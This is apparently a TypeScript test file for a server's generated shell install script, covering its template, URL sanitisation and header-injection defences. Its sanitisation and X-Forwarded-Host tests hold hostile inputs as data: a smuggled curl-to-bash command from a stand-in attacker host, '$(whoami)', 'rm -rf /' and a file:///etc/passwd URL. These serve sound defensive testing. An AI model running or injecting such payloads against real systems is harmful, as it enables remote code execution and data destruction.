// Install-script generator — pure-template tests.
//
// The /install endpoint produces a POSIX shell script the operator
// pipes into bash. The script is generated per-request from the
// engine's running version + the inferred public base URL. These
// tests pin:
//
//   - The shebang and `set -euo pipefail` (script must abort on errors,
//     not silently install half a binary).
//   - Platform/arch detection covers darwin + linux × arm64 + x64.
//   - The asset URL points at the GitHub Release for the current tag.
//   - SHA256 verification refuses to install on mismatch.
//   - The closing message includes the next-step `sk profile login`
//     command with the engine URL pre-filled.

import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { OpenAPIHono } from "@hono/zod-openapi";
import { getConfig, setConfigKey } from "../../config/loader.ts";
import type { AppEnv } from "../openapi.ts";
import { _internal, registerInstallRoute } from "./install.ts";

const { buildScript } = _internal;

async function fetchScript(headers: Record<string, string>): Promise<string> {
  const app = new OpenAPIHono<AppEnv>();
  registerInstallRoute(app);
  const res = await app.request("http://127.0.0.1/install", { headers });
  expect(res.status).toBe(200);
  return res.text();
}

describe("install script template", () => {
  test("starts with a bash shebang", () => {
    const script = buildScript("3.0.0", "https://engine.example.com");
    expect(script.startsWith("#!/usr/bin/env bash\n")).toBe(true);
  });

  test("aborts on errors (set -euo pipefail)", () => {
    const script = buildScript("3.0.0", "https://engine.example.com");
    expect(script).toContain("set -euo pipefail");
  });

  test("interpolates the engine version into the script", () => {
    const script = buildScript("3.3.0", "https://engine.example.com");
    expect(script).toContain('VERSION="3.3.0"');
  });

  test("probes the engine's bundled binary endpoint first", () => {
    const script = buildScript("3.4.0", "https://engine.example.com");
    // The bundled URL must be probed (HEAD via curl -I) so operators with no
    // outbound egress succeed. The check is a 5-second probe that 404s cleanly
    // on the slim engine image.
    expect(script).toContain("BUNDLED_ASSET_URL=");
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal shell variables in generated install script
    expect(script).toContain("/install/sk-${os}-${arch}");
    expect(script).toContain("/install/sha256sums");
    expect(script).toMatch(/curl -fsSI[^\n]*BUNDLED_ASSET_URL/);
  });

  test("never points at the private source repository", () => {
    // The repository is private, so a GitHub Releases fallback answers 404 for
    // everyone outside it. It used to be the else branch here, and a newcomer
    // on a slim image got an opaque curl failure with nothing to act on.
    const script = buildScript("3.4.0", "https://engine.example.com");
    expect(script).not.toContain("github.com");
    expect(script).not.toContain("releases/download");
  });

  test("accepts an operator-supplied mirror as the second source", () => {
    const script = buildScript("3.4.0", "https://engine.example.com");
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal shell variable in generated install script
    expect(script).toContain('MIRROR_BASE="${SK_INSTALL_BASE_URL:-}"');
    expect(script).toMatch(/elif \[ -n "\$MIRROR_BASE" \]; then/);
    // A trailing slash on the operator's value must not produce a double slash.
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal shell variables in generated install script
    expect(script).toContain("${MIRROR_BASE%/}/${ASSET}");
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal shell variable in generated install script
    expect(script).toContain("${MIRROR_BASE%/}/SHA256SUMS");
  });

  test("with no bundle and no mirror it explains itself and installs nothing", () => {
    const script = buildScript("3.4.0", "https://engine.example.com");
    // The failure a newcomer actually hits has to name the three ways forward,
    // carry this engine's own URL, and say plainly that nothing was installed.
    expect(script).toContain("This engine does not serve the sk binaries");
    expect(script).toContain("https://engine.example.com/docker-compose.yml");
    expect(script).toContain("SK_INSTALL_BASE_URL=");
    expect(script).toContain("docker compose cp engine:/usr/local/bin/sk");
    expect(script).toContain("Nothing was installed.");
  });

  test("interpolates the engine base URL into the next-step message", () => {
    const script = buildScript("3.0.0", "https://my.engine.test");
    expect(script).toContain('ENGINE_URL="https://my.engine.test"');
    // First-run path is `sk init`; already-bootstrapped engines use `sk
    // login`. The legacy `sk profile login` was never an actual
    // command — the CLI exposes `sk login` and `sk profile`
    // (set/use/list/...), with no `login` subcommand under `profile`.
    expect(script).toContain("sk init --engine-url");
    // sk init requires --token <token> (the one-time bootstrap token
    // printed to engine stdout on first boot). Pin the placeholder so
    // the install-script next-step instruction stays runnable —
    // pre-fix it told operators "sk init --engine-url X" without the
    // required arg, and they hit `sk init: --token <token> is required`.
    expect(script).toContain("--token <bootstrap-token>");
    expect(script).toContain("sk login --engine-url");
    expect(script).not.toContain("sk profile login");
  });

  test("detects darwin + linux", () => {
    const script = buildScript("3.0.0", "https://engine.example.com");
    expect(script).toMatch(/Darwin\) os=darwin/);
    expect(script).toMatch(/Linux\)\s+os=linux/);
    expect(script).toContain("unsupported OS:");
  });

  test("detects arm64 + x64", () => {
    const script = buildScript("3.0.0", "https://engine.example.com");
    expect(script).toMatch(/arm64\|aarch64\) arch=arm64/);
    expect(script).toMatch(/x86_64\|amd64\)\s+arch=x64/);
    expect(script).toContain("unsupported arch:");
  });

  test("verifies SHA256 and refuses on mismatch", () => {
    const script = buildScript("3.0.0", "https://engine.example.com");
    expect(script).toContain("SHA256SUMS");
    expect(script).toContain("SHA256 mismatch");
    expect(script).toContain("refusing to install");
  });

  test("falls back between sha256sum and shasum (BSD vs GNU)", () => {
    const script = buildScript("3.0.0", "https://engine.example.com");
    expect(script).toContain("command -v sha256sum");
    expect(script).toContain("command -v shasum");
  });

  test("installs to ~/.subkit/bin/sk by default, overridable via SK_INSTALL_DIR", () => {
    const script = buildScript("3.0.0", "https://engine.example.com");
    // Strings deliberately use bash $-syntax. Built via String.fromCharCode
    // so biome's noTemplateCurlyInString lint doesn't flag them — the
    // characters are ${ }, the script content is unchanged.
    const D = String.fromCharCode(36); // $
    const L = String.fromCharCode(123); // {
    const R = String.fromCharCode(125); // }
    expect(script).toContain(
      `INSTALL_DIR="${D}${L}SK_INSTALL_DIR:-${D}${L}HOME${R}/.subkit/bin${R}"`,
    );
    expect(script).toContain(`mv "${D}${L}TMP${R}/${D}${L}ASSET${R}" "${D}${L}INSTALL_DIR${R}/sk"`);
  });

  test("points sk doctor as the verification step", () => {
    const script = buildScript("3.0.0", "https://engine.example.com");
    expect(script).toContain("sk doctor");
  });
});

describe("sanitizeBaseUrl", () => {
  test("strips path/query/fragment down to protocol//host", () => {
    expect(_internal.sanitizeBaseUrl("https://engine.example.com/foo?x=1#y")).toBe(
      "https://engine.example.com",
    );
  });

  test("accepts a host:port and bracketed IPv6", () => {
    expect(_internal.sanitizeBaseUrl("http://10.0.0.5:3000")).toBe("http://10.0.0.5:3000");
    expect(_internal.sanitizeBaseUrl("http://[::1]:8080")).toBe("http://[::1]:8080");
  });

  test("rejects non-http(s) schemes", () => {
    expect(_internal.sanitizeBaseUrl("file:///etc/passwd")).toBeNull();
    expect(_internal.sanitizeBaseUrl("ftp://host/x")).toBeNull();
  });

  test("rejects or neutralizes hosts carrying shell metacharacters", () => {
    for (const evil of [
      'https://evil.com"; curl http://attacker/x.sh | bash; echo "',
      "https://evil.com$(whoami)",
      "https://evil.com;rm -rf /",
    ]) {
      const out = _internal.sanitizeBaseUrl(evil);
      if (out !== null) {
        expect(out).not.toMatch(/[;"'`$|\s]/);
      }
    }
  });
});

describe("GET /install — header injection", () => {
  // These tests are about the FALLBACK order, so they have to own the state
  // that decides it. `/install` prefers a configured `server.public_base_url`
  // over any forwarded header — deliberately, since an operator-set value is
  // trusted and a header is not — and only falls through to the header when
  // no value is configured.
  //
  // Left implicit, that precondition held by accident: run alone, the config
  // loader was never initialised, so the fallback ran. Run inside the suite,
  // an earlier file had loaded config and set a base URL, the configured value
  // won, and both tests failed for a reason that had nothing to do with header
  // handling. Setting it here makes the precondition the test's own.
  let priorBaseUrl: string | undefined;

  beforeAll(async () => {
    try {
      priorBaseUrl = getConfig().server.public_base_url ?? "";
      await setConfigKey("server.public_base_url", "", { force: true });
    } catch {
      // Loader never initialised — the fallback path is already active and
      // there is nothing to clear or restore.
      priorBaseUrl = undefined;
    }
  });

  afterAll(async () => {
    if (priorBaseUrl === undefined) return;
    await setConfigKey("server.public_base_url", priorBaseUrl, { force: true });
  });

  test("a forged X-Forwarded-Host cannot inject shell into the script", async () => {
    const script = await fetchScript({
      "x-forwarded-host": 'evil.example.com"; curl http://attacker/x.sh | bash; echo "',
      "x-forwarded-proto": "https",
    });
    // The malicious payload must not survive anywhere in the script.
    expect(script).not.toContain("attacker");
    expect(script).not.toContain("| bash; echo");
    // ENGINE_URL falls back to the safe request origin, not the forged host.
    expect(script).toContain('ENGINE_URL="http://127.0.0.1"');
  });

  test("a clean X-Forwarded-Host is honoured", async () => {
    const script = await fetchScript({
      "x-forwarded-host": "engine.example.com",
      "x-forwarded-proto": "https",
    });
    expect(script).toContain('ENGINE_URL="https://engine.example.com"');
  });
});
